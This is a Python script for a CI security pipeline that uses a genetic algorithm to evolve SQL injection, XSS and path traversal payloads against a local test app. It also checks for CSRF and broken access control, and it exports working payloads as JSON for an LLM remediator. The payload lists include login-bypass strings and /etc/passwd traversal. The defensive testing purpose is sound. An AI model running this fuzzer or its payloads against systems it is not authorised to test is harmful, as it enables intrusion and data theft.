#!/usr/bin/env python3
"""
Adversarial DevSecOps: Genetic Algorithm Fuzzer (The Red Team)
This script uses evolutionary computation to dynamically mutate payloads
and discover zero-day bypasses for SQLi, XSS, and Path Traversal.
It outputs successful exploits to a JSON file for the LLM Auto-Remediator.
"""

import requests
import random
import json
import time
import os
from dataclasses import dataclass
from typing import List, Tuple, Dict, Any

# Target Configuration
BASE_URL = "http://localhost:5000"
MAX_GENERATIONS = 10
POPULATION_SIZE = 20
MUTATION_RATE = 0.3

# Mutation Building Blocks
SQLI_MUTATIONS = ["'", "\"", " OR ", " AND ", "1=1", "/*", "*/", "--", "#", "SLEEP(1)", "UNION SELECT", "admin"]
XSS_MUTATIONS = ["<script>", "</script>", "alert(1)", "onerror=", "<img src=x", "javascript:", "\">", "';"]
PATH_TRAVERSAL_MUTATIONS = ["../", "..%2f", "%2e%2e%2f", "/etc/passwd", "config.py", "..\\"]
ALL_MUTATIONS = SQLI_MUTATIONS + XSS_MUTATIONS + PATH_TRAVERSAL_MUTATIONS

@dataclass
class Chromosome:
    """Represents a single payload in the population."""
    payload: str
    fitness: float = 0.0

class GeneticFuzzer:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.findings = []
        
        # Ensure reports directory exists
        if not os.path.exists('reports'):
            os.makedirs('reports')

    def generate_initial_population(self, seed_payloads: List[str]) -> List[Chromosome]:
        """Creates the starting generation based on seed payloads with slight initial mutations."""
        population = []
        for seed in seed_payloads:
            population.append(Chromosome(payload=seed))
            # Generate variants of the seed
            for _ in range(POPULATION_SIZE // len(seed_payloads) - 1):
                population.append(Chromosome(payload=self.mutate(seed)))
        return population

    def mutate(self, payload: str) -> str:
        """Randomly alters a payload to discover WAF bypasses."""
        if random.random() > MUTATION_RATE:
            return payload

        mutation_type = random.choice(["append", "prepend", "insert", "replace_char", "urlencode"])
        injection = random.choice(ALL_MUTATIONS)

        if mutation_type == "append":
            return payload + injection
        elif mutation_type == "prepend":
            return injection + payload
        elif mutation_type == "insert" and len(payload) > 1:
            idx = random.randint(1, len(payload) - 1)
            return payload[:idx] + injection + payload[idx:]
        elif mutation_type == "replace_char" and len(payload) > 0:
            idx = random.randint(0, len(payload) - 1)
            chars = list(payload)
            chars[idx] = random.choice(["'", "\"", "<", ">", "%00", "\\"])
            return "".join(chars)
        elif mutation_type == "urlencode":
            return payload.replace(" ", "%20").replace("'", "%27").replace("<", "%3C")
        
        return payload

    def crossover(self, parent1: Chromosome, parent2: Chromosome) -> Chromosome:
        """Combines two high-fitness payloads to breed a potentially stronger attack."""
        p1 = parent1.payload
        p2 = parent2.payload
        
        if len(p1) > 1 and len(p2) > 1:
            split_p1 = random.randint(1, len(p1) - 1)
            split_p2 = random.randint(1, len(p2) - 1)
            child_payload = p1[:split_p1] + p2[split_p2:]
        else:
            child_payload = p1 + p2
            
        return Chromosome(payload=self.mutate(child_payload))

    def evaluate_fitness_sqli_login(self, chromosome: Chromosome) -> bool:
        """
        Fitness Function for SQLi on Login.
        Returns True if bypass successful, otherwise calculates fitness score.
        """
        try:
            data = {'username': chromosome.payload, 'password': 'random_password'}
            start_time = time.time()
            response = self.session.post(f"{self.target_url}/login", data=data, allow_redirects=True)
            elapsed_time = time.time() - start_time

            # Reward 1: Did we bypass authentication? (Success!)
            if response.status_code == 200 and ("Dashboard" in response.text or "logout" in response.text.lower()):
                chromosome.fitness = 100.0
                return True

            # Reward 2: Did we cause a database error? (Good sign of syntax manipulation)
            if response.status_code == 500 or "OperationalError" in response.text or "syntax error" in response.text.lower():
                chromosome.fitness = 50.0
            
            # Reward 3: Time-based SQLi indicator (minor reward for slow response)
            elif elapsed_time > 1.0:
                chromosome.fitness = 10.0
            
            # Base fitness (length penalty to avoid infinitely long strings)
            else:
                chromosome.fitness = max(1.0, 5.0 - (len(chromosome.payload) * 0.1))

        except Exception as e:
            chromosome.fitness = 0.0
            
        return False

    def evaluate_fitness_xss_search(self, chromosome: Chromosome) -> bool:
        """
        Fitness Function for XSS on Search endpoint.
        Checks if the mutated payload is reflected unescaped in the HTML response.
        """
        try:
            data = {'search': chromosome.payload}
            response = self.session.post(f"{self.target_url}/search", data=data)
            
            # Reward 1: Perfect reflection of a dangerous tag (Success!)
            if chromosome.payload in response.text and ("<script>" in chromosome.payload.lower() or "onerror" in chromosome.payload.lower()):
                chromosome.fitness = 100.0
                return True

            # Reward 2: Partial reflection of special characters (Means sanitization might be weak)
            if "<" in response.text and ">" in response.text and chromosome.payload[:3] in response.text:
                chromosome.fitness = 50.0
                
            # Base fitness
            else:
                chromosome.fitness = max(1.0, 5.0 - (len(chromosome.payload) * 0.1))

        except Exception as e:
            chromosome.fitness = 0.0
            
        return False

    def evaluate_fitness_path_traversal(self, chromosome: Chromosome) -> bool:
        """
        Fitness Function for Path Traversal on /file endpoint.
        """
        try:
            response = self.session.get(f"{self.target_url}/file/{chromosome.payload}")
            
            # Reward 1: Did we download a source code file? (Success!)
            if response.status_code == 200 and ("import sqlite3" in response.text or "import os" in response.text or "Flask" in response.text):
                chromosome.fitness = 100.0
                return True

            # Reward 2: Did we hit a 500 error instead of a 404? (File system error)
            if response.status_code == 500 or "FileNotFoundError" in response.text:
                chromosome.fitness = 30.0
                
            # Base fitness
            else:
                chromosome.fitness = max(1.0, 5.0 - (len(chromosome.payload) * 0.1))

        except Exception as e:
            chromosome.fitness = 0.0
            
        return False

    def test_deterministic_csrf(self):
        """
        Deterministic Check for CSRF (Cross-Site Request Forgery).
        This tests if state-changing requests (like adding a student) succeed 
        without requiring a unique anti-CSRF token.
        """
        print(f"\n[*] Initializing Deterministic Check against CSRF - Add Student...")
        try:
            # Assume we have an active session (simplified for POC)
            self.session.post(f"{self.target_url}/login", data={'username': 'admin', 'password': 'admin123'})
            
            # Attempt state change without a CSRF token
            data = {
                'name': 'CSRF_Test_Student',
                'age': '20',
                'major': 'Computer Science'
            }
            response = self.session.post(f"{self.target_url}/add_student", data=data)
            
            # If it succeeds without rejecting a missing token, it's vulnerable
            if response.status_code == 200 or response.status_code == 302:
                # Let's check if the student was actually added
                check_res = self.session.get(f"{self.target_url}/students")
                if "CSRF_Test_Student" in check_res.text:
                    print(f"  [!] CRITICAL: CSRF Vulnerability Confirmed!")
                    self.findings.append({
                        "target": "CSRF - Add Student",
                        "vulnerability_type": "CSRF",
                        "successful_payload": "Request executed without CSRF token validation",
                        "generation_discovered": "Deterministic"
                    })
                    return
            print(f"  [-] Target resilient. CSRF protection active.")
        except Exception as e:
            print(f"  [!] Error during CSRF check: {e}")

    def test_deterministic_access_control(self):
        """
        Deterministic Check for Broken Access Control (Insecure Direct Object Reference).
        Tests if a low-privileged user can access admin-only endpoints.
        """
        print(f"\n[*] Initializing Deterministic Check against Broken Access Control...")
        try:
            # Login as a standard user (not admin)
            self.session.post(f"{self.target_url}/login", data={'username': 'user', 'password': 'password'})
            
            # Attempt to access an admin-only resource (e.g., logs or hidden admin panel)
            response = self.session.get(f"{self.target_url}/logs")
            
            # If the server returns 200 OK and shows admin data instead of 403 Forbidden
            if response.status_code == 200 and ("System Logs" in response.text or "admin" in response.text.lower()):
                print(f"  [!] CRITICAL: Broken Access Control Vulnerability Confirmed!")
                self.findings.append({
                    "target": "Access Control - /logs endpoint",
                    "vulnerability_type": "Broken_Access_Control",
                    "successful_payload": "Standard user successfully accessed restricted /logs endpoint",
                    "generation_discovered": "Deterministic"
                })
                return
            print(f"  [-] Target resilient. Access Control enforced.")
        except Exception as e:
            print(f"  [!] Error during Access Control check: {e}")

    def run_evolution_cycle(self, target_name: str, seed_payloads: List[str], eval_func) -> None:
        """Executes the Genetic Algorithm for a specific target endpoint."""
        print(f"\n[*] Initializing Genetic Algorithm against {target_name}...")
        population = self.generate_initial_population(seed_payloads)

        for generation in range(1, MAX_GENERATIONS + 1):
            print(f"  [~] Generation {generation}/{MAX_GENERATIONS} - Evolving Population...")
            
            # Evaluate Fitness
            successful_exploit = None
            for chromo in population:
                if eval_func(chromo):
                    successful_exploit = chromo
                    break
            
            # Did we hack it?
            if successful_exploit:
                print(f"  [!] CRITICAL: Autonomous Exploit Generated!")
                print(f"  [!] Payload: {successful_exploit.payload}")
                self.findings.append({
                    "target": target_name,
                    "vulnerability_type": target_name.split()[0], # e.g. "SQLi"
                    "successful_payload": successful_exploit.payload,
                    "generation_discovered": generation
                })
                return # Stop evolving for this target, move to next

            # Selection (Elitism + Roulette Wheel)
            population.sort(key=lambda x: x.fitness, reverse=True)
            next_generation = population[:2] # Keep top 2 elite payloads unchanged
            
            # Breed the rest
            weights = [max(c.fitness, 0.1) for c in population]
            while len(next_generation) < POPULATION_SIZE:
                parents = random.choices(population, weights=weights, k=2)
                child = self.crossover(parents[0], parents[1])
                next_generation.append(child)
                
            population = next_generation
            
        print(f"  [-] Target resilient. Max generations reached without bypass.")

    def run_full_dast_suite(self):
        """Runs the GA against all attack surfaces, plus deterministic checks."""
        print("=" * 60)
        print("ADVERSARIAL AI RED TEAM: GENETIC ALGORITHM FUZZER")
        print("=" * 60)

        # 1. Target: Login SQLi (Evolutionary)
        self.run_evolution_cycle(
            target_name="SQLi - Login Authentication Bypass",
            seed_payloads=["admin", "' OR 1=1 --", "admin' #", "' UNION SELECT NULL--"],
            eval_func=self.evaluate_fitness_sqli_login
        )
        
        # 2. Target: XSS Search (Evolutionary)
        self.run_evolution_cycle(
            target_name="XSS - Search Input Reflection",
            seed_payloads=["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
            eval_func=self.evaluate_fitness_xss_search
        )
        
        # 3. Target: Path Traversal (Evolutionary)
        self.run_evolution_cycle(
            target_name="Path_Traversal - File Download",
            seed_payloads=["../app.py", "..%2fapp.py", "config.py"],
            eval_func=self.evaluate_fitness_path_traversal
        )
        
        print("\n" + "=" * 60)
        print("PHASE 2: DETERMINISTIC LOGIC CHECKS")
        print("=" * 60)
        
        # 4. Target: CSRF (Deterministic)
        self.test_deterministic_csrf()
        
        # 5. Target: Broken Access Control (Deterministic)
        self.test_deterministic_access_control()

        # Output Results for the Blue Team (LLM Remediator)
        self._export_findings()

    def _export_findings(self):
        """Saves successful exploits to JSON so the LLM can use them as context."""
        report_path = 'reports/fuzzer_findings.json'
        
        print("\n" + "=" * 60)
        if self.findings:
            print(f"[!] Breaches detected. Exporting PoC payloads to {report_path}")
            with open(report_path, 'w') as f:
                json.dump({"exploits": self.findings}, f, indent=4)
            # We exit with code 1 so Jenkins knows the build failed due to a vulnerability
            print("[*] Exiting with status 1 (Vulnerable)")
            os._exit(1)
        else:
            print("[+] Application withstood Genetic Algorithm attacks. Secure.")
            # Ensure file is empty/cleared if secure
            if os.path.exists(report_path):
                os.remove(report_path)
            print("[*] Exiting with status 0 (Secure)")
            os._exit(0)

if __name__ == "__main__":
    fuzzer = GeneticFuzzer(target_url=BASE_URL)
    fuzzer.run_full_dast_suite()
